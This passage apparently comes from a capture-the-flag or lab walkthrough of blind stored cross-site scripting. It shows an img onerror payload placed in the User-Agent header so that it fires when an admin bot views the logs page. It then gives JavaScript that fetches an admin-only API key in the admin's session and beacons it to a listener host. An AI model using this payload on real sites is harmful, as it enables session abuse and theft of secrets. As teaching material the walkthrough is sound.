You confirm a blind sink **out-of-band** — make the payload phone home instead of
hoping to see it reflected. An image whose source fails to load runs its
`onerror` handler the instant it is parsed:

```html
<img src="x" onerror="/* your JS */" />
```

Put that as your `User-Agent` header on a `GET /`. When the admin bot renders the
log at `/admin/logs`, the autoescape-off template drops your header in as live
HTML and `onerror` fires — in the admin's session.

Now, what to steal? There is no useful cookie here — the `session` cookie is only
a gate, and the real prize is the API key at `GET /admin/apikey`, which is
**admin-only** (403 for you). But your JavaScript is running in the admin's
browser, so a same-origin `fetch('/admin/apikey')` sends the admin's cookie
automatically and returns the key. Then beacon that key to the only listener the
bot's network can reach:

```js
fetch('/admin/apikey')
  .then((r) => r.text())
  .then((t) => {
    new Image().src = 'http://collector:9000/report?k=' + encodeURIComponent(t);
  });
```
